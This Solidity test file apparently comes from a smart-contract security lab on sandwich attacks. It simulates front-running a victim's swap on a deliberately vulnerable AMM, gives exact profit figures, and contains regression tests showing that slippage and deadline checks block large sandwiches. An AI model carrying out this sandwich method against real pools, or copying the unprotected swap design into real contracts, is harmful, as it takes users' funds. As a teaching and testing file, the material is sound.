// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {VulnerableAmm} from "../src/VulnerableAmm.sol";
import {IERC20} from "../src/shared/IERC20.sol";
import {SafeAmm} from "../src/SafeAmm.sol";
import {HookToken} from "./fixtures/HookToken.sol";

/// @title Sandwich.t.sol
/// @notice Lab 06 — Exploit + regression test for sandwich / MEV
///         front-running.
///
/// Lab: Sandwich attack (transaction order dependence)
///
/// Threat model:
///   The AMM executes swaps at whatever price is live when the
///   transaction lands. A searcher watching the mempool can front-run a
///   victim's swap (moving the price), let the victim trade at the moved
///   price, then back-run to close the position — profiting from the
///   victim's slippage.
///
/// Violated invariant:
///   "A trader receives the price they expected when they signed."
///   With no `minAmountOut` and no deadline, the executed price is fully
///   controlled by whoever orders transactions around it.
///
/// Reproduction (pool seeded 100 A / 100 B, victim swaps 10 A for B):
///   1. Attacker front-runs: swaps 50 A -> 33.27 B (price of B rises).
///   2. Victim lands: receives ~4.16 B instead of the fair ~9.07 B.
///   3. Attacker back-runs: sells 33.27 B -> ~55.42 A.
///   Net: attacker +5.42 A, victim -4.9 B vs fair price.
///
/// Remediation:
///   `SafeAmm.swap` enforces `minAmountOut` and `deadline`. A large front-run
///   that pushes output below the caller's minimum reverts; a smaller attack
///   can remain inside that tolerance and still profit.
///
/// Regression test:
///   - A large sandwich on SafeAmm reverts below the caller's minimum.
///   - A smaller sandwich can execute within the bound and profit.
///   - Stale `deadline` reverts.
contract SandwichTest is Test {
    MinimalToken internal tokenA;
    MinimalToken internal tokenB;
    VulnerableAmm internal vulnerable;
    SafeAmm internal safe;

    uint256 internal constant LP_A = 100 ether;
    uint256 internal constant LP_B = 100 ether;
    uint256 internal constant VICTIM_IN = 10 ether;
    uint256 internal constant ATTACKER_IN = 50 ether;
    uint256 internal constant DEADLINE_BUFFER = 1 hours;

    address internal victim;

    function setUp() public {
        tokenA = new MinimalToken("Token A", "TKA");
        tokenB = new MinimalToken("Token B", "TKB");
        vulnerable = new VulnerableAmm(address(tokenA), address(tokenB));
        safe = new SafeAmm(address(tokenA), address(tokenB));

        address lp = makeAddr("lp");
        tokenA.mint(lp, 2 * LP_A);
        tokenB.mint(lp, 2 * LP_B);
        vm.startPrank(lp);
        tokenA.approve(address(vulnerable), type(uint256).max);
        tokenB.approve(address(vulnerable), type(uint256).max);
        tokenA.approve(address(safe), type(uint256).max);
        tokenB.approve(address(safe), type(uint256).max);
        vulnerable.addLiquidity(LP_A, LP_B);
        safe.addLiquidity(LP_A, LP_B);
        vm.stopPrank();

        victim = makeAddr("victim");
        tokenA.mint(victim, VICTIM_IN);
        tokenA.mint(address(this), ATTACKER_IN * 10);
        tokenB.mint(address(this), ATTACKER_IN * 10);
        tokenA.approve(address(vulnerable), type(uint256).max);
        tokenB.approve(address(vulnerable), type(uint256).max);
        tokenA.approve(address(safe), type(uint256).max);
        tokenB.approve(address(safe), type(uint256).max);
        vm.startPrank(victim);
        tokenA.approve(address(vulnerable), type(uint256).max);
        tokenA.approve(address(safe), type(uint256).max);
        vm.stopPrank();
    }

    /// @notice Mempool order is simulated by call order within the test.
    function testVulnerableAmmIsSandwiched() public {
        uint256 fairOut = vulnerable.getAmountOut(VICTIM_IN, LP_A, LP_B);

        // 1. Attacker front-runs the victim.
        uint256 attackerBalanceBBefore = tokenB.balanceOf(address(this));
        uint256 attackerPosition = vulnerable.swap(ATTACKER_IN, true);
        // The front-run must deliver exactly the returned amount in token B.
        assertEq(
            tokenB.balanceOf(address(this)) - attackerBalanceBBefore,
            attackerPosition,
            "front-run token-B delivery must match the returned amount"
        );
        // 2. Victim lands at the moved price.
        uint256 victimBalanceBBefore = tokenB.balanceOf(victim);
        vm.prank(victim);
        uint256 victimOut = vulnerable.swap(VICTIM_IN, true);
        // The victim must receive exactly the returned amount in token B.
        assertEq(
            tokenB.balanceOf(victim) - victimBalanceBBefore,
            victimOut,
            "victim token-B delivery must match the returned amount"
        );
        // 3. Attacker back-runs their exact sandwich position.
        uint256 attackerBalanceABefore = tokenA.balanceOf(address(this));
        uint256 attackerBalanceBBeforeBackRun = tokenB.balanceOf(address(this));
        uint256 backRunOut = vulnerable.swap(attackerPosition, false);
        // The back-run must deliver exactly the returned amount in token A
        // and spend exactly the front-run position in token B.
        assertEq(
            tokenA.balanceOf(address(this)) - attackerBalanceABefore,
            backRunOut,
            "back-run token-A delivery must match the returned amount"
        );
        assertEq(
            attackerBalanceBBeforeBackRun - tokenB.balanceOf(address(this)),
            attackerPosition,
            "back-run must spend the whole front-run position in token B"
        );

        // Victim lost ~54% to the sandwich.
        assertLt(victimOut, fairOut, "victim must receive less than fair");
        assertGt(fairOut - victimOut, fairOut / 2, "slippage should exceed 50%");

        // Attacker closed the round trip in profit.
        assertGt(backRunOut, ATTACKER_IN, "sandwich must be profitable");
        assertGt(tokenA.balanceOf(address(this)), ATTACKER_IN);
    }

    /// @notice Regression (m-10): not every sandwich is profitable. A 50 A
    ///         front-run against a 0.001 A victim trade in the 100/100 pool
    ///         loses ~0.1995 A before gas — the victim's trade is too small
    ///         to pay for the attacker's round trip through the 0.3% fee.
    function testLargeFrontRunAgainstTinyVictimTradeLosesMoney() public {
        uint256 attackerBalanceBefore = tokenA.balanceOf(address(this));

        uint256 frontRunOut = vulnerable.swap(50 ether, true);

        address tinyVictim = makeAddr("tiny-victim");
        tokenA.mint(tinyVictim, 0.001 ether);
        vm.prank(tinyVictim);
        tokenA.approve(address(vulnerable), type(uint256).max);
        vm.prank(tinyVictim);
        uint256 victimOut = vulnerable.swap(0.001 ether, true);
        assertGt(victimOut, 0, "victim still receives a nonzero output");

        vulnerable.swap(frontRunOut, false);

        uint256 attackerBalanceAfter = tokenA.balanceOf(address(this));
        assertLt(attackerBalanceAfter, attackerBalanceBefore, "round trip must lose money");
        uint256 loss = attackerBalanceBefore - attackerBalanceAfter;
        assertApproxEqAbs(loss, 199546488127281127, 1e12, "attacker loss must match the documented ~0.1995 A");
    }

    function testSafeAmmBlocksSandwich() public {
        uint256 fairOut = safe.getAmountOut(VICTIM_IN, LP_A, LP_B);
        uint256 deadline = block.timestamp + DEADLINE_BUFFER;

        // 1. Attacker front-runs anyway (their own trade is protected
        //    by their own bound, so it still executes).
        uint256 frontRunOut = safe.swap(ATTACKER_IN, true, safe.getAmountOut(ATTACKER_IN, LP_A, LP_B), deadline);

        // 2. Victim's transaction reverts instead of executing at a bad price.
        uint256 squeezedOut = safe.getAmountOut(VICTIM_IN, LP_A + ATTACKER_IN, LP_B - frontRunOut);
        vm.prank(victim);
        vm.expectRevert(abi.encodeWithSelector(SafeAmm.SlippageExceeded.selector, fairOut - 0.5 ether, squeezedOut));
        safe.swap(VICTIM_IN, true, fairOut - 0.5 ether, deadline);

        // 3. Without a victim to pay for the round trip, the sandwicher
        //    pays the pool fee twice.
        uint256 backRunOut = safe.swap(frontRunOut, false, 0, deadline);
        assertLt(backRunOut, ATTACKER_IN, "unmatched round trip must lose the fee");
    }

    function testSafeAmmRevertsOnExpiredDeadline() public {
        vm.warp(block.timestamp + DEADLINE_BUFFER + 1);
        vm.expectRevert(abi.encodeWithSelector(SafeAmm.Expired.selector, 0, block.timestamp));
        safe.swap(1 ether, true, 0, 0);
    }

    function testSmallSandwichCanProfitWithinSlippageBound() public {
        uint256 fairOut = safe.getAmountOut(VICTIM_IN, LP_A, LP_B);
        uint256 victimMin = fairOut - 0.5 ether;
        uint256 deadline = block.timestamp + DEADLINE_BUFFER;
        uint256 attackerBalanceBefore = tokenA.balanceOf(address(this));

        uint256 frontRunOut = safe.swap(1 ether, true, safe.getAmountOut(1 ether, LP_A, LP_B), deadline);
        uint256 victimQuote = safe.getAmountOut(VICTIM_IN, safe.reserveA(), safe.reserveB());
        assertGe(victimQuote, victimMin, "small front-run stays inside signed minimum");

        vm.prank(victim);
        uint256 victimOut = safe.swap(VICTIM_IN, true, victimMin, deadline);
        assertLt(victimOut, fairOut, "victim receives less than the pre-front-run quote");
        uint256 victimLoss = fairOut - victimOut;
        uint256 allowedLoss = fairOut - victimMin;
        assertLe(victimLoss, allowedLoss, "victim loss exceeds configured slippage tolerance");
        assertGe(victimOut, victimMin, "realized output fell below signed minimum");

        safe.swap(frontRunOut, false, 0, deadline);
        assertGt(tokenA.balanceOf(address(this)), attackerBalanceBefore, "attacker profits within tolerance");
    }

    function testSafeAmmRejectsFalseTokenReturnsAndRollsBack() public {
        MinimalToken failedOutput = new MinimalToken("Failed", "FAIL");
        SafeAmm amm = new SafeAmm(address(tokenA), address(failedOutput));
        tokenA.approve(address(amm), type(uint256).max);
        failedOutput.mint(address(this), 20 ether);
        failedOutput.approve(address(amm), type(uint256).max);
        tokenA.mint(address(this), 20 ether);
        uint256 inputBalanceBeforeLiquidity = tokenA.balanceOf(address(this));

        tokenA.setFailTransferFrom(true);
        vm.expectRevert(SafeAmm.TransferFailed.selector);
        amm.addLiquidity(10 ether, 10 ether);
        assertEq(amm.reserveA(), 0);
        assertEq(amm.reserveB(), 0);

        tokenA.setFailTransferFrom(false);
        amm.addLiquidity(10 ether, 10 ether);
        uint256 inputBalanceAfterLiquidity = tokenA.balanceOf(address(this));
        failedOutput.setFailTransfer(true);
        vm.expectRevert(SafeAmm.TransferFailed.selector);
        amm.swap(1 ether, true, 0, block.timestamp + 1);
        assertEq(amm.reserveA(), 10 ether);
        assertEq(amm.reserveB(), 10 ether);
        assertEq(tokenA.balanceOf(address(this)), inputBalanceAfterLiquidity);
        assertLt(inputBalanceAfterLiquidity, inputBalanceBeforeLiquidity);
    }

    function testSafeAmmRejectsFeeOnTransferInput() public {
        MinimalToken taxed = new MinimalToken("Taxed", "TAX");
        MinimalToken other = new MinimalToken("Other", "OTH");
        SafeAmm amm = new SafeAmm(address(taxed), address(other));
        taxed.mint(address(this), 10 ether);
        other.mint(address(this), 10 ether);
        taxed.approve(address(amm), type(uint256).max);
        other.approve(address(amm), type(uint256).max);
        taxed.setFeeBps(1_000);

        vm.expectRevert(SafeAmm.FeeOnTransferUnsupported.selector);
        amm.addLiquidity(10 ether, 10 ether);
        assertEq(amm.reserveA(), 0);
        assertEq(amm.reserveB(), 0);
        assertEq(taxed.balanceOf(address(amm)), 0);
    }

    function testSafeAmmEnforcesUint112ReserveBound() public {
        MinimalToken token = new MinimalToken("Large", "BIG");
        MinimalToken other = new MinimalToken("Other", "OTH");
        SafeAmm amm = new SafeAmm(address(token), address(other));
        uint256 tooLarge = uint256(type(uint112).max) + 1;
        token.mint(address(this), tooLarge);
        other.mint(address(this), 1);
        token.approve(address(amm), tooLarge);
        other.approve(address(amm), 1);

        vm.expectRevert(SafeAmm.ReserveOverflow.selector);
        amm.addLiquidity(tooLarge, 1);
        assertEq(amm.reserveA(), 0);
        assertEq(amm.reserveB(), 0);
    }

    function testSafeAmmUpdatesReservesBeforeTokenCallback() public {
        HookToken hooked = new HookToken();
        MinimalToken other = new MinimalToken("Other", "OTH");
        SafeAmm amm = new SafeAmm(address(hooked), address(other));
        AmmReserveObserver observer = new AmmReserveObserver();
        address lp = makeAddr("callback-lp");
        hooked.mint(lp, 200 ether);
        other.mint(lp, 200 ether);

        vm.startPrank(lp);
        hooked.approve(address(amm), type(uint256).max);
        other.approve(address(amm), type(uint256).max);
        amm.addLiquidity(100 ether, 100 ether);
        vm.stopPrank();

        uint256 expectedOut = amm.getAmountOut(1 ether, 100 ether, 100 ether);
        observer.configure(amm, uint112(101 ether), uint112(100 ether - expectedOut));
        hooked.configureCallback(
            address(observer), abi.encodeCall(observer.inspectReservesAndTryReentry, ()), false, true
        );

        hooked.mint(address(this), 1 ether);
        hooked.approve(address(amm), 1 ether);
        hooked.mint(address(observer), 1 ether);
        observer.approveInput(address(hooked), address(amm), 1 ether);
        amm.swap(1 ether, true, 0, block.timestamp + 1);

        assertTrue(observer.observedExpectedReserves(), "callback must see updated reserve effects");
        assertFalse(observer.reentrySucceeded(), "callback cannot reenter the AMM");
        assertEq(observer.reentryRevertData(), abi.encodeWithSelector(SafeAmm.Reentrancy.selector));
    }

    function testSafeAmmSupportsTokensWithNoReturnData() public {
        NoReturnToken noReturn = new NoReturnToken();
        MinimalToken other = new MinimalToken("Other", "OTH");
        SafeAmm amm = new SafeAmm(address(noReturn), address(other));
        noReturn.mint(address(this), 20 ether);
        other.mint(address(this), 20 ether);
        noReturn.approve(address(amm), type(uint256).max);
        other.approve(address(amm), type(uint256).max);

        amm.addLiquidity(10 ether, 10 ether);
        uint256 expectedOut = amm.getAmountOut(1 ether, 10 ether, 10 ether);
        uint256 received = amm.swap(1 ether, true, expectedOut, block.timestamp + 1);
        assertEq(received, expectedOut);
        assertEq(amm.reserveA(), 11 ether);
        assertEq(amm.reserveB(), 10 ether - expectedOut);
    }
}

contract AmmReserveObserver {
    SafeAmm private _amm;
    uint112 private _expectedA;
    uint112 private _expectedB;
    bool public observedExpectedReserves;
    bool public reentrySucceeded;
    bytes public reentryRevertData;

    function configure(SafeAmm amm, uint112 expectedA, uint112 expectedB) external {
        _amm = amm;
        _expectedA = expectedA;
        _expectedB = expectedB;
    }

    function inspectReservesAndTryReentry() external {
        observedExpectedReserves = _amm.reserveA() == _expectedA && _amm.reserveB() == _expectedB;
        (reentrySucceeded, reentryRevertData) =
            address(_amm).call(abi.encodeCall(SafeAmm.swap, (1 ether, true, 0, block.timestamp + 1)));
    }

    function approveInput(address token, address amm, uint256 amount) external {
        (bool success,) = token.call(abi.encodeWithSignature("approve(address,uint256)", amm, amount));
        require(success, "approve failed");
    }
}

/// @notice Minimal ERC20-ish token used to exercise the AMM labs.
contract MinimalToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    uint256 public feeBps;
    bool public failTransfer;
    bool public failTransferFrom;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory name_, string memory symbol_) {
        name = name_;
        symbol = symbol_;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function setFeeBps(uint256 feeBps_) external {
        feeBps = feeBps_;
    }

    function setFailTransfer(bool fail) external {
        failTransfer = fail;
    }

    function setFailTransferFrom(bool fail) external {
        failTransferFrom = fail;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        if (failTransfer) return false;
        uint256 fee = (amount * feeBps) / 10_000;
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount - fee;
        totalSupply -= fee;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (failTransferFrom) return false;
        uint256 fee = (amount * feeBps) / 10_000;
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount - fee;
        totalSupply -= fee;
        return true;
    }
}

contract NoReturnToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external {
        allowance[msg.sender][spender] = amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }

    function transferFrom(address from, address to, uint256 amount) external {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}
